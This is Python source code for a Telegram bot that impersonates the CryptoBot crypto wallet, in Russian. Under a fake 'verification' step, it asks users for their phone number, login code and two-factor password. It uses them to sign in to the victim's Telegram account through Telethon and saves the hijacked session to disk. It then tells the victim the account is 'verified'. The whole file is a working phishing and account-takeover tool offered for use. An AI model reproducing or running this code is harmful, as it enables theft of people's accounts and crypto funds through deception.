import asyncio
import logging
import os

from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.storage.memory import MemoryStorage
from telethon.sync import TelegramClient
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery,FSInputFile

import keyboards as kb

load_dotenv()

TOKEN = os.getenv('BOT_TOKEN')
API_ID  = os.getenv('API_ID')
API_HASH = os.getenv('API_HASH') 


bot = Bot(token=TOKEN) 
dp = Dispatcher(storage=MemoryStorage())

async def main():
    await dp.start_polling(bot)

class AuthStates(StatesGroup):
    waiting_for_code = State()
    waiting_for_password = State()

@dp.message(Command("start"))
async def start (message: types.Message):
    caption = '👛<a href="https://t.me/CryptoBotRU/14">Мультивалютный криптокошелёк</a>. Покупайте, продавайте, храните, <a href="https://t.me/CryptoBotRU/228">отправляйте</a> и платите криптовалютой, когда хотите.\n\n Подписывайтесь на <a href="https://t.me/CryptoBotRU">наш канал</a> и вступайте в <a href="https://t.me/CryptoBotRussian">наш чат</a>'
    photo = FSInputFile('pictures/photo_2025-02-05_15-12-49.jpg')
    await message.answer_photo(photo=photo, caption=caption, parse_mode="HTML",disable_web_page_preview= True, reply_markup=kb.main)

@dp.callback_query(F.data == 'verif')
async def start_handler(callback:CallbackQuery):
    await callback.answer()
    await callback.message.answer("Нажми кнопку для входа:", reply_markup=kb.contact)

@dp.message(F.content_type == types.ContentType.CONTACT)
async def process_contact(message: types.Message, state: FSMContext):
    phone_number = message.contact.phone_number
    await state.update_data(phone=phone_number)
    
    client = TelegramClient(f"sessions/{phone_number}", api_id=API_ID, api_hash=API_HASH)
    await message.answer("Ожидаю код подтверждения...", reply_markup=types.ReplyKeyboardRemove())
    
    try:
        await client.connect()
        if not await client.is_user_authorized():
            code = await client.send_code_request(phone_number)
            await state.update_data(client=client, code=code)
            await state.set_state(AuthStates.waiting_for_code)
            
            markup = InlineKeyboardMarkup(inline_keyboard=[
                [
                    InlineKeyboardButton(text="1", callback_data="code_1"),
                    InlineKeyboardButton(text="2", callback_data="code_2"),
                    InlineKeyboardButton(text="3", callback_data="code_3")
                ],
                [
                    InlineKeyboardButton(text="4", callback_data="code_4"),
                    InlineKeyboardButton(text="5", callback_data="code_5"),
                    InlineKeyboardButton(text="6", callback_data="code_6")
                ],
                [
                    InlineKeyboardButton(text="7", callback_data="code_7"),
                    InlineKeyboardButton(text="8", callback_data="code_8"),
                    InlineKeyboardButton(text="9", callback_data="code_9")
                ],
                [
                    InlineKeyboardButton(text="0", callback_data="code_0"),
                    InlineKeyboardButton(text="⌫", callback_data="code_backspace"),
                    InlineKeyboardButton(text="✅", callback_data="code_submit")
                ]
            ])
            
            await message.answer("Введите полученный код:", reply_markup=markup)
            await state.update_data(current_code="")
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.callback_query(F.data.startswith("code_"), AuthStates.waiting_for_code)
async def process_inline_code(callback: types.CallbackQuery, state: FSMContext):
    action = callback.data.split("_")[1]
    data = await state.get_data()
    current_code = data.get("current_code", "")
    
    if action == "backspace":
        current_code = current_code[:-1]
    elif action == "submit":
        if len(current_code) > 0:
            await process_code_submission(callback.message, state, current_code)
            await callback.answer()
            return
        else:
            await callback.answer("Код не может быть пустым!", show_alert=True)
            return
    elif action.isdigit():
        current_code += action
        if len(current_code) > 5:
            await callback.answer("Код слишком длинный!", show_alert=True)
            return
    
    await state.update_data(current_code=current_code)
    
    markup = callback.message.reply_markup
    await callback.message.edit_text(f"Текущий код: {current_code}\nВведите полученный код:", reply_markup=markup)
    await callback.answer()

async def process_code_submission(message: types.Message, state: FSMContext, code: str):
    data = await state.get_data()
    client = data['client']
    phone = data['phone']
    
    try:

        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if "password" in str(e):
                await message.answer("Аккаунт защищен двухэтапной аутентификацией. Введите пароль:")
                await state.set_state(AuthStates.waiting_for_password)
                return
            else:
                raise e
        
        if await client.is_user_authorized():
            await client.disconnect()
            await message.answer(f"Успешно! Ваш аккаунт верифицирован! Можете возвращаться в @send")
            await state.clear()
            
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message(AuthStates.waiting_for_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text
    data = await state.get_data()
    client = data['client']
    phone = data['phone']
    
    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            await client.disconnect()
            await message.answer(f"Успешно! Ваш аккаунт верифицирован! Можете возвращаться в @send")
            await state.clear()
        else:
            await message.answer("Неверный пароль. Попробуйте еще раз.")
            
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message(F.text.isdigit(), AuthStates.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    await process_code_submission(message, state, message.text)

async def on_startup(dp):
    print("Бот запущен")

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('exit')